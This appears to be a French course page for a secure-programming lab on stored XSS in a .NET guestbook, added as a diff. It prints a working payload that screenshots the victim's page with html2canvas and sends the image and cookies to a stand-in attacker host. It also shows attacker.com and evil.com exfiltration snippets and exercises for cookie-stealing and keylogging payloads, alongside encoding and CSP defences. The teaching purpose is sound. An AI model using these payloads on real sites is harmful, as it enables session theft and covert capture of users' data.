@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Labo XSS - Injection & Capture d'ecran | Cybersecurite</title>
+    <style>
+        :root {
+            --bg: #0f1117;
+            --surface: #1a1d27;
+            --surface-2: #242736;
+            --accent: #6c63ff;
+            --accent-light: #8b83ff;
+            --danger: #ff4757;
+            --success: #2ed573;
+            --warning: #ffa502;
+            --text: #e4e6eb;
+            --text-muted: #8b8fa3;
+            --border: #2e3142;
+            --code-bg: #12131a;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.7;
+        }
+
+        nav {
+            position: fixed;
+            top: 0; left: 0;
+            width: 260px; height: 100vh;
+            background: var(--surface);
+            border-right: 1px solid var(--border);
+            padding: 2rem 0;
+            overflow-y: auto;
+            z-index: 100;
+        }
+
+        nav .logo {
+            padding: 0 1.5rem 1.5rem;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 1rem;
+        }
+
+        nav .logo h2 { font-size: 1.1rem; color: var(--danger); }
+        nav .logo span { font-size: 0.75rem; color: var(--text-muted); }
+
+        nav a {
+            display: block;
+            padding: 0.6rem 1.5rem;
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: all 0.2s;
+            border-left: 3px solid transparent;
+        }
+
+        nav a:hover { color: var(--text); background: var(--surface-2); border-left-color: var(--danger); }
+
+        main {
+            margin-left: 260px;
+            max-width: 900px;
+            padding: 3rem 4rem;
+        }
+
+        h1 { font-size: 2.5rem; margin-bottom: 0.5rem; color: #fff; }
+        .subtitle { color: var(--text-muted); font-size: 1.1rem; margin-bottom: 3rem; }
+
+        h2 {
+            font-size: 1.6rem;
+            margin-top: 3rem; margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid var(--danger);
+            color: #fff;
+        }
+
+        h3 { font-size: 1.2rem; margin-top: 2rem; margin-bottom: 0.7rem; color: var(--accent-light); }
+        p { margin-bottom: 1rem; }
+
+        .alert {
+            padding: 1rem 1.2rem;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+            border-left: 4px solid;
+        }
+
+        .alert-danger { background: rgba(255,71,87,0.1); border-color: var(--danger); }
+        .alert-success { background: rgba(46,213,115,0.1); border-color: var(--success); }
+        .alert-warning { background: rgba(255,165,2,0.1); border-color: var(--warning); }
+        .alert-info { background: rgba(108,99,255,0.1); border-color: var(--accent); }
+        .alert strong { display: block; margin-bottom: 0.3rem; }
+
+        pre {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.2rem;
+            overflow-x: auto;
+            margin: 1rem 0 1.5rem;
+            font-size: 0.85rem;
+        }
+
+        code { font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace; color: var(--accent-light); }
+        pre code { color: var(--text); }
+        .kw { color: #c678dd; } .str { color: #98c379; } .cmt { color: #5c6370; font-style: italic; }
+        .fn { color: #61afef; } .val { color: #d19a66; } .danger-hl { color: #ff4757; font-weight: bold; }
+
+        table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; font-size: 0.92rem; }
+        th, td { padding: 0.8rem 1rem; text-align: left; border: 1px solid var(--border); }
+        th { background: var(--surface-2); color: var(--accent-light); font-weight: 600; }
+        tr:hover td { background: var(--surface); }
+
+        .badge {
+            display: inline-block; padding: 0.15rem 0.5rem; border-radius: 4px;
+            font-size: 0.75rem; font-weight: 600; text-transform: uppercase;
+        }
+        .badge-danger { background: rgba(255,71,87,0.2); color: var(--danger); }
+        .badge-success { background: rgba(46,213,115,0.2); color: var(--success); }
+
+        .diagram {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 2rem;
+            margin: 2rem 0;
+        }
+
+        .flow { display: flex; align-items: center; justify-content: center; gap: 0.5rem; flex-wrap: wrap; margin: 0.8rem 0; }
+        .flow-box {
+            background: var(--surface-2); border: 1px solid var(--border);
+            border-radius: 8px; padding: 0.7rem 1rem; font-size: 0.85rem; min-width: 140px; text-align: center;
+        }
+        .flow-box.attacker { border-color: var(--danger); background: rgba(255,71,87,0.08); }
+        .flow-box.victim { border-color: var(--warning); background: rgba(255,165,2,0.08); }
+        .flow-box.server { border-color: var(--accent); }
+        .flow-arrow { font-size: 1.4rem; color: var(--text-muted); }
+
+        .comparison { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin: 1.5rem 0; }
+        .card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 1.5rem; }
+        .card h4 { margin-bottom: 0.8rem; font-size: 1rem; }
+        .card.bad { border-top: 3px solid var(--danger); }
+        .card.bad h4 { color: var(--danger); }
+        .card.good { border-top: 3px solid var(--success); }
+        .card.good h4 { color: var(--success); }
+
+        ul, ol { margin: 0.8rem 0 1.2rem 1.5rem; }
+        li { margin-bottom: 0.4rem; }
+
+        .step-num {
+            display: inline-flex; align-items: center; justify-content: center;
+            width: 28px; height: 28px; border-radius: 50%;
+            background: var(--danger); color: #fff; font-weight: 700; font-size: 0.85rem;
+            margin-right: 0.5rem;
+        }
+
+        footer {
+            margin-top: 4rem; padding: 2rem 0; border-top: 1px solid var(--border);
+            color: var(--text-muted); font-size: 0.85rem; text-align: center;
+        }
+
+        @media (max-width: 900px) {
+            nav { display: none; }
+            main { margin-left: 0; padding: 2rem 1.5rem; }
+            .comparison { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<nav>
+    <div class="logo">
+        <h2>XSS Lab</h2>
+        <span>Labo 2 - Programmation Securisee</span>
+    </div>
+    <a href="#intro">Introduction</a>
+    <a href="#types-xss">Types de XSS</a>
+    <a href="#scenario">Scenario d'attaque</a>
+    <a href="#payload">Le payload explique</a>
+    <a href="#html2canvas">html2canvas</a>
+    <a href="#exfiltration">Exfiltration des donnees</a>
+    <a href="#vulnerable-vs-secure">Vulnerable vs Securise</a>
+    <a href="#mvp">Architecture du MVP</a>
+    <a href="#exercices">Exercices</a>
+    <a href="#protections">Se proteger du XSS</a>
+    <a href="#lien-csp">Lien avec CSP (Labo 1)</a>
+</nav>
+
+<main>
+    <!-- INTRO -->
+    <section id="intro">
+        <h1>XSS : Injection & Capture d'ecran</h1>
+        <p class="subtitle">Exploiter une Stored XSS pour exfiltrer un screenshot de la page victime</p>
+
+        <div class="alert alert-warning">
+            <strong>Avertissement legal</strong>
+            Ce laboratoire est strictement educatif. L'exploitation de failles XSS sur des systemes
+            sans autorisation explicite est un delit puni par la loi. Utilisez ces connaissances
+            uniquement dans un cadre autorise (pentests, CTF, labos).
+        </div>
+
+        <p>
+            Le <strong>Cross-Site Scripting (XSS)</strong> est une vulnerabilite qui permet a un attaquant
+            d'injecter du code JavaScript dans une page web consultee par d'autres utilisateurs.
+            C'est l'une des failles les plus repandues (OWASP Top 10) et souvent sous-estimee.
+        </p>
+        <p>
+            Dans ce labo, on va au-dela du classique <code>alert('XSS')</code> pour demontrer un
+            <strong>scenario d'exploitation realiste</strong> : capturer un screenshot de la page de la
+            victime (contenant potentiellement des donnees sensibles) et l'envoyer a un serveur attaquant.
+        </p>
+    </section>
+
+    <!-- TYPES DE XSS -->
+    <section id="types-xss">
+        <h2>Les 3 types de XSS</h2>
+
+        <table>
+            <thead>
+                <tr><th>Type</th><th>Stockage</th><th>Declenchement</th><th>Gravite</th></tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>Stored XSS</strong></td>
+                    <td>Le payload est enregistre en BDD (commentaire, profil...)</td>
+                    <td>A chaque visite de la page par n'importe quel utilisateur</td>
+                    <td><span class="badge badge-danger">CRITIQUE</span></td>
+                </tr>
+                <tr>
+                    <td><strong>Reflected XSS</strong></td>
+                    <td>Le payload est dans l'URL ou un parametre</td>
+                    <td>Quand la victime clique sur un lien piege</td>
+                    <td><span class="badge badge-danger">HAUTE</span></td>
+                </tr>
+                <tr>
+                    <td><strong>DOM-based XSS</strong></td>
+                    <td>Jamais envoye au serveur</td>
+                    <td>Manipulation du DOM cote client (innerHTML, eval...)</td>
+                    <td><span class="badge badge-danger">HAUTE</span></td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="alert alert-info">
+            <strong>Ce labo utilise la Stored XSS</strong>
+            Le payload est stocke comme commentaire dans un livre d'or. Chaque visiteur de la page
+            execute involontairement le script malveillant. C'est le type le plus dangereux car il
+            ne necessite aucune action de la victime (pas de clic sur un lien piege).
+        </div>
+    </section>
+
+    <!-- SCENARIO -->
+    <section id="scenario">
+        <h2>Scenario d'attaque complet</h2>
+
+        <div class="diagram">
+            <p style="margin-bottom:1.5rem; color: var(--text-muted); font-weight:600;">
+                Flux de l'attaque XSS avec capture d'ecran
+            </p>
+
+            <div class="flow">
+                <span class="step-num">1</span>
+                <div class="flow-box attacker">Attaquant<br><small>injecte le payload XSS<br>dans le livre d'or</small></div>
+                <div class="flow-arrow">&rarr;</div>
+                <div class="flow-box server">Serveur web<br><small>stocke le commentaire<br>en base de donnees</small></div>
+            </div>
+
+            <div class="flow" style="margin-top:1.5rem;">
+                <span class="step-num">2</span>
+                <div class="flow-box victim">Victime<br><small>visite le livre d'or</small></div>
+                <div class="flow-arrow">&rarr;</div>
+                <div class="flow-box server">Serveur web<br><small>renvoie la page avec<br>le payload (non encode)</small></div>
+                <div class="flow-arrow">&rarr;</div>
+                <div class="flow-box victim">Navigateur victime<br><small>execute le script<br>injecte</small></div>
+            </div>
+
+            <div class="flow" style="margin-top:1.5rem;">
+                <span class="step-num">3</span>
+                <div class="flow-box victim">Navigateur victime<br><small>html2canvas capture<br>la page entiere</small></div>
+                <div class="flow-arrow">&rarr;</div>
+                <div class="flow-box attacker">Serveur attaquant<br><small>recoit le screenshot<br>+ cookies + URL</small></div>
+            </div>
+        </div>
+
+        <h3>Ce que l'attaquant recupere</h3>
+        <ul>
+            <li><strong>Screenshot complet</strong> de la page vue par la victime (donnees bancaires, emails, dashboard admin...)</li>
+            <li><strong>Cookies de session</strong> (si pas proteges par <code>HttpOnly</code>)</li>
+            <li><strong>URL exacte</strong> de la page visitee</li>
+            <li><strong>User-Agent</strong> (navigateur, OS) pour du fingerprinting</li>
+        </ul>
+    </section>
+
+    <!-- PAYLOAD -->
+    <section id="payload">
+        <h2>Anatomie du payload XSS</h2>
+
+        <p>Le payload utilise dans ce labo :</p>
+
+        <pre><code>&lt;<span class="kw">img</span> <span class="fn">src</span>=<span class="str">x</span> <span class="fn">onerror</span>=<span class="str">"
+  var s = document.createElement('script');
+  s.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
+  s.onload = function() {
+    html2canvas(document.body).then(function(canvas) {
+      fetch('http://ATTACKER/api/exfiltration/capture', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          image: canvas.toDataURL(),
+          url: window.location.href,
+          cookies: document.cookie,
+          userAgent: navigator.userAgent
+        })
+      })
+    })
+  };
+  document.head.appendChild(s)
+"</span>&gt;</code></pre>
+
+        <h3>Decomposition etape par etape</h3>
+
+        <table>
+            <thead><tr><th>Etape</th><th>Code</th><th>Explication</th></tr></thead>
+            <tbody>
+                <tr>
+                    <td><strong>1. Declenchement</strong></td>
+                    <td><code>&lt;img src=x onerror="..."&gt;</code></td>
+                    <td>
+                        L'image <code>src=x</code> n'existe pas, ce qui declenche <code>onerror</code>.
+                        Alternative a <code>&lt;script&gt;</code> qui peut etre filtre par certains WAF.
+                    </td>
+                </tr>
+                <tr>
+                    <td><strong>2. Chargement lib</strong></td>
+                    <td><code>document.createElement('script')</code></td>
+                    <td>
+                        Charge dynamiquement <code>html2canvas</code> depuis un CDN.
+                        Technique classique pour importer des outils sans les embarquer.
+                    </td>
+                </tr>
+                <tr>
+                    <td><strong>3. Capture</strong></td>
+                    <td><code>html2canvas(document.body)</code></td>
+                    <td>
+                        Capture le rendu visuel complet de la page dans un <code>&lt;canvas&gt;</code>.
+                        Inclut texte, images, formulaires, donnees affichees.
+                    </td>
+                </tr>
+                <tr>
+                    <td><strong>4. Conversion</strong></td>
+                    <td><code>canvas.toDataURL()</code></td>
+                    <td>
+                        Convertit le canvas en image base64 (<code>data:image/png;base64,...</code>).
+                        Peut etre transmis en JSON sans upload de fichier.
+                    </td>
+                </tr>
+                <tr>
+                    <td><strong>5. Exfiltration</strong></td>
+                    <td><code>fetch(url, {method: 'POST', ...})</code></td>
+                    <td>
+                        Envoie silencieusement les donnees au serveur de l'attaquant.
+                        La victime ne voit rien, tout se passe en arriere-plan.
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="alert alert-info">
+            <strong>Pourquoi &lt;img onerror&gt; plutot que &lt;script&gt; ?</strong>
+            Beaucoup de filtres naifs cherchent <code>&lt;script&gt;</code> et le supprime.
+            Mais il existe des dizaines de vecteurs d'injection : <code>onerror</code>, <code>onload</code>,
+            <code>onfocus</code>, <code>onmouseover</code>, <code>svg/onload</code>, etc.
+            C'est pourquoi le filtrage par blacklist ne fonctionne pas.
+        </div>
+    </section>
+
+    <!-- HTML2CANVAS -->
+    <section id="html2canvas">
+        <h2>html2canvas : capturer une page en image</h2>
+
+        <p>
+            <code>html2canvas</code> est une librairie JavaScript legitime qui "photographie" une page
+            web en lisant le DOM et en le redessinant dans un <code>&lt;canvas&gt;</code>.
+        </p>
+
+        <h3>Utilisation normale (legitime)</h3>
+        <pre><code><span class="cmt">// Generer un PDF ou une image d'un rapport web</span>
+html2canvas(document.querySelector(<span class="str">"#report"</span>)).then(<span class="kw">function</span>(canvas) {
+    <span class="kw">var</span> link = document.createElement(<span class="str">'a'</span>);
+    link.download = <span class="str">'rapport.png'</span>;
+    link.href = canvas.toDataURL();
+    link.click();
+});</code></pre>
+
+        <h3>Utilisation detournee (dans notre attaque)</h3>
+        <pre><code><span class="cmt">// Capturer la page de la victime et exfiltrer</span>
+html2canvas(document.<span class="fn">body</span>).then(<span class="kw">function</span>(canvas) {
+    fetch(<span class="str">'http://attacker.com/steal'</span>, {
+        method: <span class="str">'POST'</span>,
+        body: JSON.stringify({ image: canvas.<span class="fn">toDataURL</span>() })
+    });
+});</code></pre>
+
+        <div class="alert alert-warning">
+            <strong>Dual-use</strong>
+            html2canvas est un outil legitime utilise par des milliers de sites. Son utilisation
+            malveillante illustre le concept de "dual-use" en cybersecurite : la meme technologie
+            peut servir a des fins constructives ou destructives.
+        </div>
+    </section>
+
+    <!-- EXFILTRATION -->
+    <section id="exfiltration">
+        <h2>Exfiltration des donnees</h2>
+
+        <p>Dans ce labo, l'exfiltration se fait vers une API dans la meme application.
+           En realite, l'attaquant utiliserait un serveur externe.</p>
+
+        <h3>Methodes d'exfiltration courantes</h3>
+        <table>
+            <thead><tr><th>Methode</th><th>Comment</th><th>Avantage</th></tr></thead>
+            <tbody>
+                <tr>
+                    <td><code>fetch()</code> / <code>XMLHttpRequest</code></td>
+                    <td>POST vers un serveur externe</td>
+                    <td>Peut envoyer de gros volumes (screenshots)</td>
+                </tr>
+                <tr>
+                    <td><code>&lt;img src="http://evil.com/steal?data=..."&gt;</code></td>
+                    <td>Donnees dans l'URL de l'image</td>
+                    <td>Fonctionne meme si fetch est bloque</td>
+                </tr>
+                <tr>
+                    <td>WebSocket</td>
+                    <td>Canal bidirectionnel vers l'attaquant</td>
+                    <td>Communication interactive en temps reel</td>
+                </tr>
+                <tr>
+                    <td>DNS exfiltration</td>
+                    <td>Donnees encodees dans des requetes DNS</td>
+                    <td>Traverse la plupart des firewalls</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>Structure des donnees envoyees</h3>
+        <pre><code>{
+    <span class="str">"image"</span>: <span class="str">"data:image/png;base64,iVBORw0KGgo..."</span>,  <span class="cmt">// Screenshot complet</span>
+    <span class="str">"url"</span>: <span class="str">"http://bank.com/account/dashboard"</span>,      <span class="cmt">// Page visitee</span>
+    <span class="str">"cookies"</span>: <span class="str">"session=abc123; user=jean"</span>,            <span class="cmt">// Cookies accessibles</span>
+    <span class="str">"userAgent"</span>: <span class="str">"Mozilla/5.0 (Windows NT 10.0...)"</span>   <span class="cmt">// Fingerprint</span>
+}</code></pre>
+    </section>
+
+    <!-- VULNERABLE VS SECURE -->
+    <section id="vulnerable-vs-secure">
+        <h2>Code vulnerable vs securise</h2>
+
+        <div class="comparison">
+            <div class="card bad">
+                <h4>VULNERABLE : Html.Raw()</h4>
+<pre><code><span class="cmt">// Le contenu est injecte tel quel dans le HTML</span>
+@("@")<span class="danger-hl">Html.Raw</span>(comment.Content)
+
+<span class="cmt">// Resultat si content = "&lt;script&gt;alert(1)&lt;/script&gt;" :</span>
+<span class="danger-hl">&lt;script&gt;alert(1)&lt;/script&gt;</span>
+<span class="cmt">// Le navigateur EXECUTE le script !</span></code></pre>
+            </div>
+            <div class="card good">
+                <h4>SECURISE : Encodage Razor</h4>
+<pre><code><span class="cmt">// Razor encode automatiquement les caracteres HTML</span>
+@("@")comment.Content
+
+<span class="cmt">// Resultat si content = "&lt;script&gt;alert(1)&lt;/script&gt;" :</span>
+&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+<span class="cmt">// Le navigateur AFFICHE le texte brut !</span></code></pre>
+            </div>
+        </div>
+
+        <div class="alert alert-success">
+            <strong>Regle d'or</strong>
+            Ne JAMAIS utiliser <code>Html.Raw()</code> avec du contenu provenant d'un utilisateur.
+            Razor encode par defaut avec <code>@("@")variable</code>. Faites confiance au framework.
+        </div>
+    </section>
+
+    <!-- MVP -->
+    <section id="mvp">
+        <h2>Architecture du MVP .NET</h2>
+
+        <pre><code>XssLabApp/
+├── Controllers/
+│   ├── HomeController.cs           <span class="cmt">// Page d'accueil avec instructions</span>
+│   ├── GuestbookController.cs      <span class="cmt">// Livre d'or (vulnerable + securise)</span>
+│   ├── AttackerController.cs       <span class="cmt">// Dashboard avec les captures</span>
+│   └── ExfiltrationApiController.cs <span class="cmt">// API qui recoit les screenshots</span>
+├── Models/
+│   ├── Comment.cs                  <span class="cmt">// Modele de commentaire</span>
+│   ├── CapturedData.cs             <span class="cmt">// Donnees exfiltrees</span>
+│   └── GuestbookViewModel.cs       <span class="cmt">// ViewModel pour les vues</span>
+├── Services/
+│   ├── CommentStore.cs             <span class="cmt">// Stockage commentaires (simule BDD)</span>
+│   └── CaptureStore.cs             <span class="cmt">// Stockage captures</span>
+├── Views/
+│   ├── Home/Index.cshtml           <span class="cmt">// Accueil + scenario d'attaque</span>
+│   ├── Guestbook/
+│   │   ├── Vulnerable.cshtml       <span class="cmt">// Html.Raw() = XSS possible</span>
+│   │   └── Secure.cshtml           <span class="cmt">// Razor encode = XSS bloque</span>
+│   └── Attacker/
+│       └── Dashboard.cshtml        <span class="cmt">// Visualisation des captures</span>
+└── Program.cs                      <span class="cmt">// Configuration de l'app</span></code></pre>
+
+        <h3>Lancer le MVP</h3>
+        <pre><code><span class="kw">cd</span> XssLabApp
+<span class="kw">dotnet</span> run</code></pre>
+
+        <h3>Demarche du labo</h3>
+        <ol>
+            <li>Ouvrir la page d'accueil et lire le scenario</li>
+            <li>Aller sur <strong>Livre d'or (Vulnerable)</strong></li>
+            <li>Copier le payload XSS propose en bas de page</li>
+            <li>Le coller dans le champ "Commentaire" et publier</li>
+            <li>Observer : la page se recharge, le script s'execute silencieusement</li>
+            <li>Aller sur <strong>Dashboard Attaquant</strong> : le screenshot est la</li>
+            <li>Refaire le test sur <strong>Livre d'or (Securise)</strong> : le payload s'affiche en texte brut</li>
+        </ol>
+    </section>
+
+    <!-- EXERCICES -->
+    <section id="exercices">
+        <h2>Exercices pour les etudiants</h2>
+
+        <div class="alert alert-info">
+            <strong>Exercice 1 : Variantes de payload</strong>
+            Essayez de creer un payload XSS qui utilise un vecteur different de <code>&lt;img onerror&gt;</code>.
+            Par exemple : <code>&lt;svg onload&gt;</code>, <code>&lt;body onload&gt;</code>,
+            <code>&lt;details open ontoggle&gt;</code>.
+        </div>
+
+        <div class="alert alert-info">
+            <strong>Exercice 2 : Vol de cookies</strong>
+            Modifiez le payload pour envoyer uniquement les cookies (sans screenshot).
+            Quelle est la difference si le cookie a le flag <code>HttpOnly</code> ?
+        </div>
+
+        <div class="alert alert-info">
+            <strong>Exercice 3 : Keylogger XSS</strong>
+            Ecrivez un payload qui ecoute les frappes clavier (<code>keydown</code>) sur la page
+            et les envoie a l'API d'exfiltration. Quelles donnees pourriez-vous capturer ?
+        </div>
+
+        <div class="alert alert-info">
+            <strong>Exercice 4 : Ajouter CSP</strong>
+            En utilisant le labo 1 (CSP), ajoutez un middleware CSP a cette application.
+            Verifiez que le payload XSS est bloque. Quelle directive empeche quoi ?
+        </div>
+
+        <div class="alert alert-info">
+            <strong>Exercice 5 : Filtrage input</strong>
+            Implementez une validation cote serveur dans <code>GuestbookController.AddComment()</code>
+            qui sanitise le HTML. Comparez les approches : blacklist vs whitelist vs encodage.
+        </div>
+    </section>
+
+    <!-- PROTECTIONS -->
+    <section id="protections">
+        <h2>Se proteger du XSS</h2>
+
+        <table>
+            <thead><tr><th>Protection</th><th>Niveau</th><th>Details</th></tr></thead>
+            <tbody>
+                <tr>
+                    <td><strong>Encodage des sorties</strong></td>
+                    <td>Obligatoire</td>
+                    <td>Utiliser <code>@("@")variable</code> en Razor (pas <code>Html.Raw</code>). Encoder selon le contexte (HTML, JS, URL, CSS).</td>
+                </tr>
+                <tr>
+                    <td><strong>Validation des entrees</strong></td>
+                    <td>Obligatoire</td>
+                    <td>Whitelist de caracteres autorises. Rejeter les patterns suspects.</td>
+                </tr>
+                <tr>
+                    <td><strong>Content Security Policy</strong></td>
+                    <td>Defense en profondeur</td>
+                    <td>Bloque les scripts inline et les domaines non autorises (voir labo 1).</td>
+                </tr>
+                <tr>
+                    <td><strong>HttpOnly cookies</strong></td>
+                    <td>Obligatoire</td>
+                    <td>Empeche JavaScript de lire les cookies de session.</td>
+                </tr>
+                <tr>
+                    <td><strong>SameSite cookies</strong></td>
+                    <td>Recommande</td>
+                    <td>Empeche l'envoi de cookies dans les requetes cross-site.</td>
+                </tr>
+                <tr>
+                    <td><strong>X-XSS-Protection</strong></td>
+                    <td>Obsolete</td>
+                    <td>Ancien filtre navigateur. Remplace par CSP. Ne plus utiliser.</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="alert alert-success">
+            <strong>Ordre de priorite</strong>
+            1. Encoder les sorties &rarr; 2. Valider les entrees &rarr; 3. CSP &rarr; 4. HttpOnly/SameSite cookies.
+            L'encodage des sorties est la protection la plus importante. Les autres sont des couches supplementaires.
+        </div>
+    </section>
+
+    <!-- LIEN CSP -->
+    <section id="lien-csp">
+        <h2>Lien avec le Labo 1 (CSP)</h2>
+
+        <p>Ce labo demontre <strong>pourquoi CSP est necessaire</strong>. Voici ce que CSP aurait bloque dans notre attaque :</p>
+
+        <table>
+            <thead><tr><th>Action du payload</th><th>Directive CSP qui bloque</th><th>Resultat</th></tr></thead>
+            <tbody>
+                <tr>
+                    <td><code>onerror="..."</code> (inline handler)</td>
+                    <td><code>script-src</code> sans <code>'unsafe-inline'</code></td>
+                    <td><span class="badge badge-success">BLOQUE</span></td>
+                </tr>
+                <tr>
+                    <td>Chargement de html2canvas depuis CDN</td>
+                    <td><code>script-src 'self'</code> (CDN non autorise)</td>
+                    <td><span class="badge badge-success">BLOQUE</span></td>
+                </tr>
+                <tr>
+                    <td><code>fetch()</code> vers serveur attaquant</td>
+                    <td><code>connect-src 'self'</code> (domaine externe)</td>
+                    <td><span class="badge badge-success">BLOQUE</span></td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="alert alert-danger">
+            <strong>Mais attention</strong>
+            Si CSP autorise <code>'unsafe-inline'</code> (erreur courante), le handler <code>onerror</code>
+            s'execute. Si CSP autorise le CDN dans <code>script-src</code>, la lib est chargee.
+            Et si <code>connect-src</code> est absent, <code>default-src</code> s'applique.
+            <strong>Une CSP mal configuree = pas de protection.</strong>
+        </div>
+    </section>
+
+    <footer>
+        Condorcet 2026 - BAC Cyber Securite - Programmation Securisee - Labo 2 : XSS
+    </footer>
+</main>
+
+</body>
+</html>
